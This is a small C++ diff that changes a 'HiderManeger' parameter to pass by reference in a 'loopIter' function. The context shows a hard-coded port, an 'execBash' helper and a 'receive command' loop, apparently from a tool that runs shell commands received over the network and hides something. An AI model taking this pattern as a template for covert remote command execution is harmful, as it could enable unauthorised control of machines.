@@ -11,7 +11,7 @@
 
 #define PORT (65432)
 
-void loopIter(Connection& conn, SoftwareManeger& swm, HiderManeger hiderManeger);
+void loopIter(Connection& conn, SoftwareManeger& swm, HiderManeger& hiderManeger);
 void testSoftwareManeger(void);
 
 int main() {
@@ -55,7 +55,7 @@ std::string execBash(const char* cmd) {
 }
 
 
-void loopIter(Connection& conn, SoftwareManeger& swm, HiderManeger hiderManeger)
+void loopIter(Connection& conn, SoftwareManeger& swm, HiderManeger& hiderManeger)
 {
     // receive command
     Status res = SUCCSESS;
